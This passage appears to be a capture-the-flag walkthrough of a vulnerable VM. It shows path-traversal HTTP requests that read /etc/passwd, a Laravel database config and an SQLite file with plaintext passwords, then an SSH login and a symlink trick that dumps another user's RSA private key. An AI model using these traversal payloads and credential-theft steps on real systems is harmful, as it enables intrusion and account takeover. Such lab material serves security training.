GET /image/download?filename=....//....//....//....//etc/passwd HTTP/1.1
Host: 192.168.174.138
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.5.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.174.138/
Cookie: laravel_session=eyJpdiI6IkdFM0YzbFdMVXUyRnl1T0xxUHAzajNMWGk0Tk9GSjlPUmNcL3hTOTQ3Q1NJPSIsInZhbHVlIjoieGc0eWR6SzlBK0U2MDN0Q2xaa3JoZU11Z0FpQm0rVUc0S2xpWGVZS2VHck5uVTM1WDRYdnFvRXU2dmxaeHdHNVRSRlQzV25KblpPSlFnXC9YTmh2ZFBRPT0iLCJtYWMiOiI0YWM1N2JiZmI3ZmNlNmY2NjVlYjg1ZGZhZTgxNDNkZDA5MWIwNmE5MGI0MjhiN2E5Y2U1MmJjYWQzNWFjODJhIn0%3D
Connection: keep-alive
Response
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
syslog:x:101:103::/home/syslog:/bin/false
messagebus:x:102:105::/var/run/dbus:/bin/false
whoopsie:x:103:106::/nonexistent:/bin/false
landscape:x:104:109::/var/lib/landscape:/bin/false
sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
robin:x:1000:1000:robin,,,:/home/robin:/bin/bash
mysql:x:106:114:MySQL Server,,,:/nonexistent:/bin/false
dean:x:1001:1001:,,,:/home/dean:/bin/bash

Access the database config file
Request
GET /image/download?filename=....//app/config/database.php HTTP/1.1
Host: 192.168.174.138
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.5.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.174.138/
Cookie: laravel_session=eyJpdiI6IkdFM0YzbFdMVXUyRnl1T0xxUHAzajNMWGk0Tk9GSjlPUmNcL3hTOTQ3Q1NJPSIsInZhbHVlIjoieGc0eWR6SzlBK0U2MDN0Q2xaa3JoZU11Z0FpQm0rVUc0S2xpWGVZS2VHck5uVTM1WDRYdnFvRXU2dmxaeHdHNVRSRlQzV25KblpPSlFnXC9YTmh2ZFBRPT0iLCJtYWMiOiI0YWM1N2JiZmI3ZmNlNmY2NjVlYjg1ZGZhZTgxNDNkZDA5MWIwNmE5MGI0MjhiN2E5Y2U1MmJjYWQzNWFjODJhIn0%3D
Connection: keep-alive
Response
<?php

return array(

	/*
	|--------------------------------------------------------------------------
	| PDO Fetch Style
	|--------------------------------------------------------------------------
	|
	| By default, database results will be returned as instances of the PHP
	| stdClass object; however, you may desire to retrieve records in an
	| array format for simplicity. Here you can tweak the fetch style.
	|
	*/

	'fetch' => PDO::FETCH_CLASS,

	/*
	|--------------------------------------------------------------------------
	| Default Database Connection Name
	|--------------------------------------------------------------------------
	|
	| Here you may specify which of the database connections below you wish
	| to use as your default connection for all database work. Of course
	| you may use many connections at once using the Database library.
	|
	*/

	// Jan 2014 note: We have moved away from the old crappy SQLite 2.x database and moved
	// on to the new and improved MySQL database. So, I will just comment out this as it is
	// no longer in use

	//'default' => 'sqlite',
	'default' => 'mysql',

	/*
	|--------------------------------------------------------------------------
	| Database Connections
	|--------------------------------------------------------------------------
	|
	| Here are each of the database connections setup for your application.
	| Of course, examples of configuring each database platform that is
	| supported by Laravel is shown below to make development simple.
	|
	|
	| All database work in Laravel is done through the PHP PDO facilities
	| so make sure you have the driver for your particular database of
	| choice installed on your machine before you begin development.
	|
	*/

	'connections' => array(

		'sqlite' => array(
			'driver'   => 'sqlite',
			'database' => __DIR__.'/../database/production.sqlite', // OLD DATABASE NO LONGER IN USE!
			'prefix'   => '',
		),

		'mysql' => array(
			'driver'    => 'mysql',
			'host'      => 'localhost',
			'database'  => 'flick',
			'username'  => 'flick',
			'password'  => 'resuddecNeydmar3',
			'charset'   => 'utf8',
			'collation' => 'utf8_unicode_ci',
			'prefix'    => '',
		),

		'pgsql' => array(
			'driver'   => 'pgsql',
			'host'     => 'localhost',
			'database' => 'forge',
			'username' => 'forge',
			'password' => '',
			'charset'  => 'utf8',
			'prefix'   => '',
			'schema'   => 'public',
		),

		'sqlsrv' => array(
			'driver'   => 'sqlsrv',
			'host'     => 'localhost',
			'database' => 'database',
			'username' => 'root',
			'password' => '',
			'prefix'   => '',
		),

	),

	/*
	|--------------------------------------------------------------------------
	| Migration Repository Table
	|--------------------------------------------------------------------------
	|
	| This table keeps track of all the migrations that have already run for
	| your application. Using this information, we can determine which of
	| the migrations on disk haven't actually been run in the database.
	|
	*/

	'migrations' => 'migrations',

	/*
	|--------------------------------------------------------------------------
	| Redis Databases
	|--------------------------------------------------------------------------
	|
	| Redis is an open source, fast, and advanced key-value store that also
	| provides a richer set of commands than a typical key-value systems
	| such as APC or Memcached. Laravel makes it easy to dig right in.
	|
	*/

	'redis' => array(

		'cluster' => false,

		'default' => array(
			'host'     => '127.0.0.1',
			'port'     => 6379,
			'database' => 0,
		),

	),

);

We have the path to 'database' => __DIR__.'/../database/production.sqlite', // OLD DATABASE NO LONGER IN USE!

Request
GET /image/download?filename=....//app/database/production.sqlite HTTP/1.1
Host: 192.168.174.138
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.5.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.174.138/
Cookie: laravel_session=eyJpdiI6IkdFM0YzbFdMVXUyRnl1T0xxUHAzajNMWGk0Tk9GSjlPUmNcL3hTOTQ3Q1NJPSIsInZhbHVlIjoieGc0eWR6SzlBK0U2MDN0Q2xaa3JoZU11Z0FpQm0rVUc0S2xpWGVZS2VHck5uVTM1WDRYdnFvRXU2dmxaeHdHNVRSRlQzV25KblpPSlFnXC9YTmh2ZFBRPT0iLCJtYWMiOiI0YWM1N2JiZmI3ZmNlNmY2NjVlYjg1ZGZhZTgxNDNkZDA5MWIwNmE5MGI0MjhiN2E5Y2U1MmJjYWQzNWFjODJhIn0%3D
Connection: keep-alive
Response
* This file contains an SQLite 2.1 database
dean: FumKivcenfodErk0Chezauggyokyait5fojEpCayclEcyaj2heTwef0OlNiphAnA
robin: JoofimOwEakpalv4Jijyiat5GloonTojatticEirracksIg4yijovyirtAwUjad1J

9.) Try password on SSH
root@kali:~# ssh dean@192.168.174.138

\x56\x6d\x30\x77\x64\x32\x51\x79\x55\x58\x6c\x56\x57\x47\x78\x57\x56\x30\x64\x34
\x56\x31\x59\x77\x5a\x44\x52\x57\x4d\x56\x6c\x33\x57\x6b\x52\x53\x57\x46\x4a\x74
\x65\x46\x5a\x56\x4d\x6a\x41\x31\x56\x6a\x41\x78\x56\x32\x4a\x45\x54\x6c\x68\x68
\x4d\x6b\x30\x78\x56\x6d\x70\x4b\x53\x31\x49\x79\x53\x6b\x56\x55\x62\x47\x68\x6f
\x54\x56\x68\x43\x55\x56\x5a\x74\x65\x46\x5a\x6c\x52\x6c\x6c\x35\x56\x47\x74\x73
\x61\x6c\x4a\x74\x61\x47\x39\x55\x56\x6d\x68\x44\x56\x56\x5a\x61\x63\x56\x46\x74
\x52\x6c\x70\x57\x4d\x44\x45\x31\x56\x54\x4a\x30\x56\x31\x5a\x58\x53\x6b\x68\x68
\x52\x7a\x6c\x56\x56\x6d\x78\x61\x4d\x31\x5a\x73\x57\x6d\x46\x6b\x52\x30\x35\x47
\x57\x6b\x5a\x53\x54\x6d\x46\x36\x52\x54\x46\x57\x56\x45\x6f\x77\x56\x6a\x46\x61
\x57\x46\x4e\x72\x61\x47\x68\x53\x65\x6d\x78\x57\x56\x6d\x70\x4f\x54\x30\x30\x78
\x63\x46\x5a\x58\x62\x55\x5a\x72\x55\x6a\x41\x31\x52\x31\x64\x72\x57\x6e\x64\x57
\x4d\x44\x46\x46\x55\x6c\x52\x47\x56\x31\x5a\x46\x62\x33\x64\x57\x61\x6b\x5a\x68
\x56\x30\x5a\x4f\x63\x6d\x46\x48\x61\x46\x4e\x6c\x62\x58\x68\x58\x56\x6d\x30\x78
\x4e\x46\x6c\x56\x4d\x48\x68\x58\x62\x6b\x35\x59\x59\x6c\x56\x61\x63\x6c\x56\x71
\x51\x54\x46\x53\x4d\x57\x52\x79\x56\x32\x78\x4f\x56\x57\x4a\x56\x63\x45\x64\x5a
\x4d\x46\x5a\x33\x56\x6a\x4a\x4b\x56\x56\x4a\x59\x5a\x46\x70\x6c\x61\x33\x42\x49
\x56\x6d\x70\x47\x54\x32\x52\x57\x56\x6e\x52\x68\x52\x6b\x35\x73\x59\x6c\x68\x6f
\x57\x46\x5a\x74\x4d\x58\x64\x55\x4d\x56\x46\x33\x54\x55\x68\x6f\x61\x6c\x4a\x73
\x63\x46\x6c\x5a\x62\x46\x5a\x68\x59\x32\x78\x57\x63\x56\x46\x55\x52\x6c\x4e\x4e
\x56\x6c\x59\x31\x56\x46\x5a\x53\x55\x31\x5a\x72\x4d\x58\x4a\x6a\x52\x6d\x68\x57
\x54\x57\x35\x53\x4d\x31\x5a\x71\x53\x6b\x74\x57\x56\x6b\x70\x5a\x57\x6b\x5a\x77
\x62\x47\x45\x7a\x51\x6b\x6c\x57\x62\x58\x42\x48\x56\x44\x4a\x53\x56\x31\x5a\x75
\x55\x6d\x68\x53\x61\x7a\x56\x7a\x57\x57\x78\x6f\x62\x31\x64\x47\x57\x6e\x52\x4e
\x53\x47\x68\x50\x55\x6d\x31\x34\x56\x31\x52\x56\x61\x47\x39\x58\x52\x30\x70\x79
\x54\x6c\x5a\x73\x57\x6d\x4a\x47\x57\x6d\x68\x5a\x4d\x6e\x68\x58\x59\x7a\x46\x57
\x63\x6c\x70\x47\x61\x47\x6c\x53\x4d\x31\x46\x36\x56\x6a\x4a\x30\x55\x31\x55\x78
\x57\x6e\x4a\x4e\x57\x45\x70\x71\x55\x6d\x31\x6f\x56\x31\x52\x58\x4e\x56\x4e\x4e
\x4d\x56\x70\x78\x55\x32\x74\x30\x56\x31\x5a\x72\x63\x46\x70\x58\x61\x31\x70\x33
\x56\x6a\x46\x4b\x56\x32\x4e\x49\x62\x46\x64\x57\x52\x55\x70\x6f\x56\x6b\x52\x4b
\x54\x32\x52\x47\x53\x6e\x4a\x61\x52\x6d\x68\x70\x56\x6a\x4e\x6f\x56\x56\x64\x57
\x55\x6b\x39\x52\x4d\x57\x52\x48\x56\x32\x35\x53\x54\x6c\x5a\x46\x53\x6c\x68\x55
\x56\x33\x68\x48\x54\x6c\x5a\x61\x57\x45\x35\x56\x4f\x56\x68\x53\x4d\x48\x42\x4a
\x56\x6c\x64\x34\x63\x31\x64\x74\x53\x6b\x68\x68\x52\x6c\x4a\x58\x54\x55\x5a\x77
\x56\x46\x5a\x71\x52\x6e\x64\x53\x4d\x56\x4a\x30\x5a\x55\x64\x73\x55\x32\x4a\x59
\x59\x33\x68\x57\x61\x31\x70\x68\x56\x54\x46\x56\x65\x46\x64\x75\x53\x6b\x35\x58
\x52\x58\x42\x78\x56\x57\x78\x6b\x4e\x47\x46\x47\x56\x58\x64\x68\x52\x55\x35\x55
\x55\x6d\x78\x77\x65\x46\x55\x79\x64\x47\x46\x69\x52\x6c\x70\x7a\x56\x32\x78\x77
\x57\x47\x45\x78\x63\x44\x4e\x5a\x61\x32\x52\x47\x5a\x57\x78\x47\x63\x6d\x4a\x47
\x5a\x46\x64\x4e\x4d\x45\x70\x4a\x56\x6d\x74\x53\x53\x31\x55\x78\x57\x58\x68\x57
\x62\x6c\x5a\x57\x59\x6c\x68\x43\x56\x46\x6c\x72\x56\x6e\x64\x57\x56\x6c\x70\x30
\x5a\x55\x63\x35\x55\x6b\x31\x58\x55\x6e\x70\x57\x4d\x6a\x56\x4c\x56\x30\x64\x4b
\x53\x46\x56\x74\x4f\x56\x56\x57\x62\x48\x42\x59\x56\x47\x78\x61\x59\x56\x64\x48
\x56\x6b\x68\x6b\x52\x32\x68\x70\x55\x6c\x68\x42\x64\x31\x64\x57\x56\x6d\x39\x55
\x4d\x56\x70\x30\x55\x6d\x35\x4b\x54\x31\x5a\x73\x53\x6c\x68\x55\x56\x6c\x70\x33
\x56\x30\x5a\x72\x65\x46\x64\x72\x64\x47\x70\x69\x56\x6b\x70\x49\x56\x6c\x64\x34
\x61\x32\x46\x57\x53\x6e\x52\x50\x56\x45\x35\x58\x54\x57\x35\x6f\x57\x46\x6c\x71
\x53\x6b\x5a\x6c\x52\x6d\x52\x5a\x57\x6b\x55\x31\x56\x31\x5a\x73\x63\x46\x56\x58
\x56\x33\x52\x72\x56\x54\x46\x73\x56\x31\x56\x73\x57\x6c\x68\x69\x56\x56\x70\x7a
\x57\x57\x74\x61\x64\x32\x56\x47\x56\x58\x6c\x6b\x52\x45\x4a\x58\x54\x56\x5a\x77
\x65\x56\x59\x79\x65\x48\x64\x58\x62\x46\x70\x58\x59\x30\x68\x4b\x56\x31\x5a\x46
\x57\x6b\x78\x57\x4d\x56\x70\x48\x59\x32\x31\x4b\x52\x31\x70\x47\x5a\x45\x35\x4e
\x52\x58\x42\x4b\x56\x6d\x31\x30\x55\x31\x4d\x78\x56\x58\x68\x58\x57\x47\x68\x68
\x55\x30\x5a\x61\x56\x6c\x6c\x72\x57\x6b\x74\x6a\x52\x6c\x70\x78\x56\x47\x30\x35
\x56\x31\x5a\x73\x63\x45\x68\x58\x56\x45\x35\x76\x59\x56\x55\x78\x57\x46\x56\x75
\x63\x46\x64\x4e\x56\x32\x68\x32\x56\x31\x5a\x61\x53\x31\x49\x78\x54\x6e\x56\x52
\x62\x46\x5a\x58\x54\x54\x46\x4b\x4e\x6c\x5a\x48\x64\x47\x46\x68\x4d\x6b\x35\x7a
\x56\x32\x35\x53\x61\x31\x4a\x74\x55\x6e\x42\x57\x62\x47\x68\x44\x54\x6c\x5a\x6b
\x56\x56\x46\x74\x52\x6d\x70\x4e\x56\x31\x49\x77\x56\x54\x4a\x30\x61\x31\x64\x48
\x53\x6c\x68\x68\x52\x30\x5a\x56\x56\x6d\x78\x77\x4d\x31\x70\x58\x65\x48\x4a\x6c
\x56\x31\x5a\x49\x5a\x45\x64\x30\x55\x32\x45\x7a\x51\x58\x64\x58\x62\x46\x5a\x68
\x59\x54\x4a\x47\x56\x31\x64\x75\x53\x6d\x6c\x6c\x61\x31\x70\x59\x57\x57\x78\x6f
\x51\x31\x52\x47\x55\x6e\x4a\x58\x62\x45\x70\x73\x55\x6d\x31\x53\x65\x6c\x6c\x56
\x57\x6c\x4e\x68\x56\x6b\x70\x31\x55\x57\x78\x77\x56\x32\x4a\x59\x55\x6c\x68\x61
\x52\x45\x5a\x72\x55\x6a\x4a\x4b\x53\x56\x52\x74\x61\x46\x4e\x57\x56\x46\x5a\x61
\x56\x6c\x63\x78\x4e\x47\x51\x79\x56\x6b\x64\x57\x62\x6c\x4a\x72\x55\x6b\x56\x4b
\x62\x31\x6c\x59\x63\x45\x64\x6c\x56\x6c\x4a\x7a\x56\x6d\x35\x4f\x57\x47\x4a\x47
\x63\x46\x68\x5a\x4d\x47\x68\x4c\x56\x32\x78\x61\x57\x46\x56\x72\x5a\x47\x46\x57
\x56\x31\x4a\x51\x56\x54\x42\x6b\x52\x31\x49\x79\x52\x6b\x68\x69\x52\x6b\x35\x70
\x59\x54\x42\x77\x4d\x6c\x5a\x74\x4d\x54\x42\x56\x4d\x55\x31\x34\x56\x56\x68\x73
\x56\x56\x64\x48\x65\x46\x5a\x5a\x56\x45\x5a\x33\x59\x55\x5a\x57\x63\x56\x4e\x74
\x4f\x56\x64\x53\x62\x45\x70\x5a\x56\x47\x78\x6a\x4e\x57\x45\x79\x53\x6b\x64\x6a
\x52\x57\x68\x58\x59\x6c\x52\x42\x4d\x56\x5a\x58\x63\x33\x68\x58\x52\x6c\x5a\x7a
\x59\x55\x5a\x6b\x54\x6c\x59\x79\x61\x44\x4a\x57\x61\x6b\x4a\x72\x55\x7a\x46\x6b
\x56\x31\x5a\x75\x53\x6c\x42\x57\x62\x48\x42\x76\x57\x56\x52\x47\x64\x31\x4e\x57
\x57\x6b\x68\x6c\x52\x30\x5a\x61\x56\x6d\x31\x53\x52\x31\x52\x73\x57\x6d\x46\x56
\x52\x6c\x6c\x35\x59\x55\x5a\x6f\x57\x6c\x64\x49\x51\x6c\x68\x56\x4d\x46\x70\x68
\x59\x31\x5a\x4f\x63\x56\x56\x73\x57\x6b\x35\x57\x4d\x55\x6c\x33\x56\x6c\x52\x4b
\x4d\x47\x49\x79\x52\x6b\x64\x54\x62\x6b\x35\x55\x59\x6b\x64\x6f\x56\x6c\x5a\x73
\x57\x6e\x64\x4e\x4d\x56\x70\x79\x56\x32\x31\x47\x61\x6c\x5a\x72\x63\x44\x42\x61
\x52\x57\x51\x77\x56\x6a\x4a\x4b\x63\x6c\x4e\x72\x61\x46\x64\x53\x4d\x32\x68\x6f
\x56\x6b\x52\x4b\x52\x31\x59\x78\x54\x6e\x56\x56\x62\x45\x4a\x58\x55\x6c\x52\x57
\x57\x56\x64\x57\x55\x6b\x64\x6b\x4d\x6b\x5a\x48\x56\x32\x78\x57\x55\x32\x45\x78
\x63\x48\x4e\x56\x62\x54\x46\x54\x5a\x57\x78\x73\x56\x6c\x64\x73\x54\x6d\x68\x53
\x56\x45\x5a\x61\x56\x56\x63\x31\x62\x31\x59\x78\x57\x58\x70\x68\x53\x45\x70\x61
\x59\x57\x74\x61\x63\x6c\x56\x71\x52\x6c\x64\x6a\x4d\x6b\x5a\x47\x54\x31\x5a\x6b
\x56\x31\x5a\x47\x57\x6d\x46\x57\x62\x47\x4e\x34\x54\x6b\x64\x52\x65\x56\x5a\x72
\x5a\x46\x64\x69\x62\x45\x70\x79\x56\x57\x74\x57\x53\x32\x49\x78\x62\x46\x6c\x6a
\x52\x57\x52\x73\x56\x6d\x78\x4b\x65\x6c\x5a\x74\x4d\x44\x56\x58\x52\x30\x70\x48
\x59\x30\x5a\x6f\x57\x6b\x31\x48\x61\x45\x78\x57\x4d\x6e\x68\x68\x56\x30\x5a\x57
\x63\x6c\x70\x48\x52\x6c\x64\x4e\x4d\x6d\x68\x4a\x56\x31\x52\x4a\x65\x46\x4d\x78
\x53\x58\x68\x6a\x52\x57\x52\x68\x55\x6d\x73\x31\x57\x46\x59\x77\x56\x6b\x74\x4e
\x62\x46\x70\x30\x59\x30\x56\x6b\x57\x6c\x59\x77\x56\x6a\x52\x57\x62\x47\x68\x76
\x56\x30\x5a\x6b\x53\x47\x46\x47\x57\x6c\x70\x69\x57\x47\x68\x6f\x56\x6d\x31\x34
\x63\x32\x4e\x73\x5a\x48\x4a\x6b\x52\x33\x42\x54\x59\x6b\x5a\x77\x4e\x46\x5a\x58
\x4d\x54\x42\x4e\x52\x6c\x6c\x34\x56\x32\x35\x4f\x61\x6c\x4a\x58\x61\x46\x68\x57
\x61\x6b\x35\x54\x56\x45\x5a\x73\x56\x56\x46\x59\x61\x46\x4e\x57\x61\x33\x42\x36
\x56\x6b\x64\x34\x59\x56\x55\x79\x53\x6b\x5a\x58\x57\x48\x42\x58\x56\x6c\x5a\x77
\x52\x31\x51\x78\x57\x6b\x4e\x56\x62\x45\x4a\x56\x54\x55\x51\x77\x50\x51\x3d\x3d

 .o88o. oooo   o8o            oooo        
 888 `" `888   `"'            `888        
o888oo   888  oooo   .ooooo.   888  oooo  
 888     888  `888  d88' `"Y8  888 .8P'   
 888     888   888  888        888888.    
 888     888   888  888   .o8  888 `88b.  
o888o   o888o o888o `Y8bod8P' o888o o888o 
                                          

dean@192.168.174.138's password: 
Welcome to Ubuntu 12.04.4 LTS (GNU/Linux 3.11.0-15-generic x86_64)

 * Documentation:  https://help.ubuntu.com/

  System information as of Mon Nov 23 19:54:39 SAST 2015

  System load:  0.0               Processes:              117
  Usage of /:   35.8% of 6.99GB   Users logged in:        0
  Memory usage: 50%               IP address for eth0:    192.168.174.138
  Swap usage:   0%                IP address for docker0: 172.17.42.1

  Graph this data and manage this system at:
    https://landscape.canonical.com/

New release '14.04.3 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Last login: Sat Aug  2 14:42:15 2014 from 192.168.56.1
dean@flick:~$ 
dean@flick:~$ ls
message.txt  read_docker
dean@flick:~$ cat message.txt 
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

Hi Dean,

I will be away on leave for the next few weeks. I have asked the admin guys to
write a quick script that will allow you to read my .dockerfile for flick-
a-photo so that you can continue working in my absense.

The .dockerfile is in my home, so the path for the script will be something like
/home/robin/flick-dev/

Please call me if you have any troubles!

- --
Ciao
Robin
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1

iQIcBAEBAgAGBQJT32ZsAAoJENRCTh/agc2DTNIP/0+ut1jWzk7VgJlT6tsGB0Ah
yi24i2b+JAVtINzCNgJ+rXUStaAEudTvJDF28b/wZCaFVFoNJ8Q30J03FXo4SRnA
ZW6HZZIGEKdlD10CcXsQrLMRmWZlBDQnCm4+EMOvavS1uU9gVvcaYhnow6uwZlwR
enf71LvtS1h0+PrFgSIoItBI4/lx7BiYY9o3hJyaQWkmAZsZLWQpJtROe8wsxb1l
9o4jCJrADeJBsYM+xLExsXaEobHfKtRtsM+eipHXIWIH+l+xTi8Y1/XIlgEHCelU
jUg+Hswq6SEch+1T5B+9EPoeiLT8Oi2Rc9QePSZ3n0fe4f3WJ47lEYGLLEUrKNG/
AFLSPnxHTVpHNO72KJSae0cG+jpj1OKf3ErjdTk1PMJy75ntQCrgtnGnp9xvpk0b
0xg6cESLGNkrqDGopsN/mgi6+2WKtUuO5ycwVXFImY3XYl+QVZgd/Ntpu4ZjyZUT
lxqCAk/G1s43s+ySFKSoHZ8c/CuOKTsyn6uwI3NxBZPD04xfzoc0/R/UpIpUmneK
q9LddBQK4vxPab8i4GNDiMp+KXyfByO864PtKQnCRkGQewanxoN0lmjB/0eKhkmf
Yer1sBmumWjjxR8TBY3cVRMH93zpIIwqxRNOG6bnnSVzzza5DJuNssppCmXLOUL9
nZAuFXkGFu6cMMD4rDXQ
=2moZ
-----END PGP SIGNATURE-----
dean@flick:~$ ./read_docker 
ERROR: A path is required!
Usage is: ./read_docker /path/to/dockerfile
dean@flick:~$ ./read_docker /home/robin/flick-dev/
# Flick-a-photo dev env
RUN apt-get update && apt-get install -y php5 libapache2-mod-php5 php5-mysql php5-cli && apt-get clean && rm -rf /var/lib/apt/lists/*

CMD ["/usr/sbin/apache2", "-D", "FOREGROUND"]

Create our own dockerfile and creating a symbolic link between that one and Robinâ€™s id_rsa
dean@flick:~$ ln -s /home/robin/.ssh/id_rsa Dockerfile
dean@flick:~$ ./read_docker /home/dean/
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAlv/0uKdHFQ4oT06Kp3yg0tL1fFVl4H+iS1UOqds0HrgBCTSw
ECwVwhrIFJa/u5FOPGst8t35CKo4VWX3KNHXFNVtUXWeQFpe/rB/0wi+k8E8WtXi
FBjLiFOqTDL0kgXRoQzUPlYg0+LAXo5EbMq+rB2ZgMJTxunJFV2m+uKtbZZRvzU6
S1Fj6XHh/U0E68d6sZ/+y1UhSJLaFYUQMkfLtjxPa17sPZ+kwB1R4puhVTprfQOk
CinfW01ot2Rj2HLMR5CpgA28dmxw8W6w0MGtXurTegj1ydFOTgB1/k4XpXnSGNO9
d2AlVR/NsKDAuYKdgRGFFh91nGZTl1p4em48YwIDAQABAoIBADI3bwhVwSL0cV1m
jmAC520VcURnFhlh+PQ6lkTQvHWW1elc10yZjKbfxzhppdvYB/+52S8SuPYzvcZQ
wbCWkIPCMrfLeNSH+V2UDv58wvxaYBsJVEVAtbdhs5nhvEovmzaHELKmbAZrO3R2
tbTEfEK7GUij176oExKC8bwv1GND/qQBwLtEJj/YVJSsdvrwroCde+/oJHJ76ix4
Ty8sY5rhKYih875Gx+7IZNPSDn45RsnlORm8fd5EGLML6Vm3iLfwkHIxRdj9DFoJ
wJcPX7ZWTsmyJLwoHe3XKklz2KW185hIr9M2blMgrPC2ZuTnvBXmEWuy86+xxAB0
mFXYMdkCgYEAx6yab3huUTgTwReaVpysUEqy4c5nBLKqs6eRjVyC9jchQfOqo5AQ
l8bd6Xdrk0lvXnVkZK0vw2zwqlk8N/vnZjfWnCa4unnv2CZXS9DLaeU6gRgRQFBI
JB+zHyhus+ill4aWHitcEXiBEjUHx4roC7Al/+tr//cjwUCwlHk75F0CgYEAwZhZ
gBjAo9X+/oFmYlgVebfR3kLCD4pVPMz+HyGCyjSj0+ddsHkYiHBhstBtHh9vU+Pn
JMhrtR9yzXukuyQr/ns1mhEQOUtTaXrsy/1FyRBaISrtcyGAruu5yWubT0gXk2Dq
rwyb6M6MbnwEMZr2mSBU5l27cTKypFqgcA58l78CgYAWM5vsXxCtGTYhFzXDAaKr
PtMLBn8v54nRdgVaGXo6VEDva1+C1kbyCVutVOjyNI0cjKMACr2v1hIgbtGiS/Eb
zYOgUzHhEiPX/dNhC7NCcAmERx/L7eFHmvq4sS81891NrtpMOnf/PU3kr17REiHh
AtIG1a9pg5pHJ6E6sQw2xQKBgHXeqm+BopieDFkstAeglcK8Fr16a+lGUktojDis
EJPIpQ65yaNOt48qzXEv0aALh57OHceZd2qZsS5G369JgLe6kJIzXWtk325Td6Vj
mX+nwxh6qIP2nADkaQOnzrHgtOn4kiruRGbki0AhpfQF46qrssVnwF5Vfcrvmstf
JqDFAoGBAI9KJamhco8BBka0PUWgJ3R2ZqE1viTvyME1G25h7tJb17cIeB/PeTS1
Q9KMFl61gpl0J4rJEIakeGpXuehwYAzNBv7n6yr8CNDNkET/cVhp+LCmbS91FwAK
VP0mqDppzOZ04B9FQD8Af6kUzxzGFH8tAN5SNYSW88I9Z8lVpfkn
-----END RSA PRIVATE KEY-----
dean@flick:~$ 

We have Robin's private key so we can SSH into it
root@kali:~# nano id_rsa 
root@kali:~# cat id_rsa 
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAlv/0uKdHFQ4oT06Kp3yg0tL1fFVl4H+iS1UOqds0HrgBCTSw
ECwVwhrIFJa/u5FOPGst8t35CKo4VWX3KNHXFNVtUXWeQFpe/rB/0wi+k8E8WtXi
FBjLiFOqTDL0kgXRoQzUPlYg0+LAXo5EbMq+rB2ZgMJTxunJFV2m+uKtbZZRvzU6
S1Fj6XHh/U0E68d6sZ/+y1UhSJLaFYUQMkfLtjxPa17sPZ+kwB1R4puhVTprfQOk
CinfW01ot2Rj2HLMR5CpgA28dmxw8W6w0MGtXurTegj1ydFOTgB1/k4XpXnSGNO9
d2AlVR/NsKDAuYKdgRGFFh91nGZTl1p4em48YwIDAQABAoIBADI3bwhVwSL0cV1m
jmAC520VcURnFhlh+PQ6lkTQvHWW1elc10yZjKbfxzhppdvYB/+52S8SuPYzvcZQ
wbCWkIPCMrfLeNSH+V2UDv58wvxaYBsJVEVAtbdhs5nhvEovmzaHELKmbAZrO3R2
tbTEfEK7GUij176oExKC8bwv1GND/qQBwLtEJj/YVJSsdvrwroCde+/oJHJ76ix4
Ty8sY5rhKYih875Gx+7IZNPSDn45RsnlORm8fd5EGLML6Vm3iLfwkHIxRdj9DFoJ
wJcPX7ZWTsmyJLwoHe3XKklz2KW185hIr9M2blMgrPC2ZuTnvBXmEWuy86+xxAB0
mFXYMdkCgYEAx6yab3huUTgTwReaVpysUEqy4c5nBLKqs6eRjVyC9jchQfOqo5AQ
l8bd6Xdrk0lvXnVkZK0vw2zwqlk8N/vnZjfWnCa4unnv2CZXS9DLaeU6gRgRQFBI
JB+zHyhus+ill4aWHitcEXiBEjUHx4roC7Al/+tr//cjwUCwlHk75F0CgYEAwZhZ
gBjAo9X+/oFmYlgVebfR3kLCD4pVPMz+HyGCyjSj0+ddsHkYiHBhstBtHh9vU+Pn
JMhrtR9yzXukuyQr/ns1mhEQOUtTaXrsy/1FyRBaISrtcyGAruu5yWubT0gXk2Dq
rwyb6M6MbnwEMZr2mSBU5l27cTKypFqgcA58l78CgYAWM5vsXxCtGTYhFzXDAaKr
PtMLBn8v54nRdgVaGXo6VEDva1+C1kbyCVutVOjyNI0cjKMACr2v1hIgbtGiS/Eb
zYOgUzHhEiPX/dNhC7NCcAmERx/L7eFHmvq4sS81891NrtpMOnf/PU3kr17REiHh
AtIG1a9pg5pHJ6E6sQw2xQKBgHXeqm+BopieDFkstAeglcK8Fr16a+lGUktojDis
EJPIpQ65yaNOt48qzXEv0aALh57OHceZd2qZsS5G369JgLe6kJIzXWtk325Td6Vj
